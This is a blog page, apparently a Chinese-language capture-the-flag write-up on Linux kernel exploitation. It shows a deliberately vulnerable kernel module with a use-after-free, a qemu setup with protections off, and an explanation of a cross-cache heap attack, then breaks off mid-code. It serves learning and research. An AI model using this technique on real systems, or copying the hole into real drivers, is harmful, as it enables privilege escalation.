
  <!DOCTYPE html>
  <html lang="en"  >
  <head>
  <meta charset="utf-8">
  

  

  

  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
  
  <title>
    speed-run-r1rn-kernel-challenge |
    
    堇姬 Naup&#39;s Blog
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  
    <meta name="description" content="Speed Run r1rn kernel challenge noteCross-Cache Attackslub 相關的知識可以參考這https:&#x2F;&#x2F;hackmd.io&#x2F;@naup96321&#x2F;BkeiK5Kexl 這邊簡單在介紹一次   我們可以知道，整個 OS 有相當多的 kmem_cache 這種 memory pool他會嘗試去找對應大小 object 的 kmem_cache其拿取的順">
<meta property="og:type" content="article">
<meta property="og:title" content="speed-run-r1rn-kernel-challenge">
<meta property="og:url" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/index.html">
<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
<meta property="og:description" content="Speed Run r1rn kernel challenge noteCross-Cache Attackslub 相關的知識可以參考這https:&#x2F;&#x2F;hackmd.io&#x2F;@naup96321&#x2F;BkeiK5Kexl 這邊簡單在介紹一次   我們可以知道，整個 OS 有相當多的 kmem_cache 這種 memory pool他會嘗試去找對應大小 object 的 kmem_cache其拿取的順">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/PTE.png">
<meta property="og:image" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/ring_buffer.png">
<meta property="og:image" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/ring_buffer2.png">
<meta property="og:image" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/mem1.png">
<meta property="og:image" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/mem2.png">
<meta property="og:image" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/mem3.png">
<meta property="article:published_time" content="2025-10-24T02:07:16.000Z">
<meta property="article:modified_time" content="2025-10-24T02:52:35.425Z">
<meta property="article:author" content="Naup堇姬">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/PTE.png">
  
  
    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/fav.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">

  
  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>

  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        
          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg>
        
      </div>
      <div class="loading-word">Naup...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/">Home</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/archives">Archives</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/about">About</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
    
    
    
  </nav>
</div>
<header id="header">
  
    <picture></picture>
    <img fetchpriority="high" src="/images/posts_cover/os-arch/126727093_p0_master1200.jpg" alt="speed-run-r1rn-kernel-challenge">
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">speed-run-r1rn-kernel-challenge</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content"  class="sidebar-right" >
          <aside id="sidebar">
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Speed-Run-r1rn-kernel-challenge-note"><span class="toc-number">1.</span> <span class="toc-text">Speed Run r1rn kernel challenge note</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Cache-Attack"><span class="toc-number">1.1.</span> <span class="toc-text">Cross-Cache Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze"><span class="toc-number">1.1.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack"><span class="toc-number">1.1.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">1.1.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirty-PageTable"><span class="toc-number">1.2.</span> <span class="toc-text">Dirty PageTable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirty-Cred"><span class="toc-number">1.3.</span> <span class="toc-text">Dirty Cred</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirty-pipe"><span class="toc-number">1.4.</span> <span class="toc-text">Dirty pipe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe"><span class="toc-number">1.4.2.</span> <span class="toc-text">pipe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.4.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pagejack"><span class="toc-number">1.5.</span> <span class="toc-text">pagejack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pagejack-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">pagejack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.3.</span> <span class="toc-text">exploit</span></a></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">84</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">21</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
      
      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  <div class="sidebar-widget">
  
  </div>
</aside>

          <section id="main"><article id="post-speed-run-r1rn-kernel-challenge" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <a href="/2025/10/24/speed-run-r1rn-kernel-challenge/" class="article-date-link" data-aos="zoom-in">
    <time datetime="2025-10-24T02:07:16.000Z" itemprop="datePublished">2025-10-24</time>
    <time style="display: none;" id="post-update-time">2025-10-24</time>
  </a>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id="Speed-Run-r1rn-kernel-challenge-note"><a href="#Speed-Run-r1rn-kernel-challenge-note" class="headerlink" title="Speed Run r1rn kernel challenge note"></a>Speed Run r1rn kernel challenge note</h1><h2 id="Cross-Cache-Attack"><a href="#Cross-Cache-Attack" class="headerlink" title="Cross-Cache Attack"></a>Cross-Cache Attack</h2><p>slub 相關的知識可以參考這<br><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/BkeiK5Kexl">https://hackmd.io/@naup96321/BkeiK5Kexl</a></p>
<p>這邊簡單在介紹一次  </p>
<p>我們可以知道，整個 OS 有相當多的 kmem_cache 這種 memory pool<br>他會嘗試去找對應大小 object 的 kmem_cache<br>其拿取的順序會從 kmem_cache_cpu 的 freelist，然後 active slab freelist，partial<br>然後去 kmem_cache_node partial<br>最後如果都沒有可用的，就會去 buddy system 分配 page 來用  </p>
<h3 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h3><p>他去創建了一個 device，裡面有定義一些 ioctl 這部分等等提到<br>之後去創建了一個 kmem_cache，其是一個大小為 0x200 obj 的結構體  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SIZE    0x200</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obj</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> buf[OBJ_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> &#123;</span><br><span class="line">    .unlocked_ioctl = module_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_dev</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name = <span class="string">&quot;vuln&quot;</span>,</span><br><span class="line">    .fops = &amp;module_fops</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">module_initialize</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (misc_register(&amp;vuln_dev) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    obj_cachep = KMEM_CACHE(obj, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!obj_cachep) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kernel module 定義了一些 ioctl<br>就是基本的 alloc、write、free  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_WRITE   0xf001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_FREE    0xf002</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_MAX     0x200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;req, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(req)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.id &lt; <span class="number">0</span> || req.id &gt; OBJ_MAX - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_lock(&amp;module_lock);</span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> CMD_ALLOC:</span><br><span class="line">            ret = obj_alloc(req.id);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> CMD_WRITE:</span><br><span class="line">            ret = obj_write(req.id, req.data, req.size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> CMD_FREE:</span><br><span class="line">            ret = obj_free(req.id);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_unlock(&amp;module_lock);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這份 kernel driver 仔細看有一個 UAF<br>他在 free <code>objs</code> array 中某個 pointer 指向的 object 沒有去清空 pointer，因此可以去操作已被釋放的 object</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">obj</span> *<span class="title">objs</span>[<span class="title">OBJ_MAX</span>];</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">obj_cachep</span>;</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">DEFINE_MUTEX</span><span class="params">(module_lock)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[id] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (objs[id] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_write</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[id] == <span class="literal">NULL</span> || size &gt; OBJ_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(objs[id]-&gt;buf, data, size) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_free</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    kmem_cache_free(obj_cachep, objs[id]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是因為我們 UAF 的 kmem_cache 是一個自己創建的，利用價值比起其他結構是比較低的，因此希望可以通過 cross cache 來去嘗試分配到其他結構體 UAF，達到控制 RIP、任意讀寫等  </p>
<p>其核心概念就是讓有 UAF 的 object，跟著整個 slab 一起被 buddy system 回收，再去 spray 想要分配到的 struct，來將這塊 page 被其他 kmem_cache 拿去用  </p>
<h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>來看題目文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -cpu qemu64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -drive file=rootfs.ext3,format=raw \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda rw init=/init console=ttyS0 nokaslr nopti loglevel=3 oops=panic panic=-1&quot;</span></span><br></pre></td></tr></table></figure>

<p>看起來是幾乎保護都沒有開<br>題目給了 ext3，將其掛載起來編寫內容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /home/naup/Desktop/linux-kernel-exploitation/cross-cache-attack/sysfile</span><br><span class="line">sudo mount ./rootfs.ext3 /home/naup/Desktop/linux-kernel-exploitation/cross-cache-attack/sysfile</span><br></pre></td></tr></table></figure>

<p>接下來可以去看這個檔案</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ # ls /sys/kernel/slab/obj</span><br><span class="line">aliases            hwcache_align      partial            slabs</span><br><span class="line">align              min_partial        poison             slabs_cpu_partial</span><br><span class="line">cache_dma          object_size        reclaim_account    store_user</span><br><span class="line">cpu_partial        objects            red_zone           total_objects</span><br><span class="line">cpu_slabs          objects_partial    sanity_checks      trace</span><br><span class="line">ctor               objs_per_slab      shrink             validate</span><br><span class="line">destroy_by_rcu     order              slab_size</span><br></pre></td></tr></table></figure>
<p>底下有很多很好用的資訊<br>objs_per_slab 代表一個 slab，有多少個 objects，這裡印出 8 ，代表有 8 個  </p>
<p>另一個重要的是 cpu_partial<br>代表一個 CPU 本地可以去放置在 partial 中最大的 slab 數量<br>這邊印出來是 52  </p>
<p>接下來我們來嘗試讓 UAF object 被 buddy system 回收  </p>
<p>因此我們做一件事<br>先去分配 <code>objs_per_slab * (cpu_partial + 1)</code> 個<br>之後再分配一個 object 來去刷新 active object<br>確保整個 active slab 是我們可控制的<br>接下來我們有 <code>objs_per_slab * (cpu_partial + 1)</code> 個 full slab<br>接下來關注一件事，當 partial 滿的時候，他會去嘗試刷新整個 partial<br>其中所有 object 都被釋放狀態的 slab 會被 buddy system 回收<br>這裡的 slab 是一個 1 page 的 slab，也就是會進入 order 0 (0x200 * 8 &#x3D; 1 page &#x3D; 4kb)<br>但是如果讓連續的 page 被回收的話，會被 buddy system 合併到更高 order 的地方<br>讓我們 UAF page 被低 order slab 分配的機率下降<br>因此我們去釋放不連續的 page<br>讓雙數的 page 所有的 object 被 free 掉<br>單數的只 free 掉一塊  </p>
<p>這樣在 partial 滿的狀態時候，他只會去把所有都 free 掉的回收  </p>
<p>PS: 不是 page 被回收後都會進入到 buddy system freelist 中<br>buddy system 會維護以 page 為單位的記憶體分配，但根據需求的不同，上層子系統可能會請求 order-0、order-1 等不同大小的連續記憶體。為了處理碎片化，buddy system 內部會使用一個 PCP (per-cpu-page) 的結構做 page-level caching。這個結構有幾個特色：<br>每個 CPU 都會有一個<br>共有 14 個 list 來維護 cached page，分別是 4 種大小 (order-{0,1,2,3}) 乘以 3 種 migrate type (unmovable, movable, reclaimable) 共 12 種，再加上 THP (一種特別的 huge page 型態) 2 種  </p>
<p>在釋放 (slab) cache 時，PCP 會先判斷該塊記憶體是否在 order 0 ~ 3 的範圍，如果是的話，就會先被 cache 到對應的 PCP list 內。反之亦然，請求 page 時也會先看 PCP list 是否有 page 可以用。  </p>
<p>可以想像 cache 機制不會維護太多 page，所以當 page 超過一定的數量 (threshold) 時，就會真正的回到 buddy system。太少也會先從 buddy system 拿一些來用。  </p>
<p>從這邊其實可以很清楚的觀察到這件事<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.16/source/mm/page_alloc.c#L2692">https://elixir.bootlin.com/linux/v6.16/source/mm/page_alloc.c#L2692</a>  </p>
<p>去觀察 &#x2F;proc&#x2F;zoneinfo 也是個方法  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">show_zoneinfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(<span 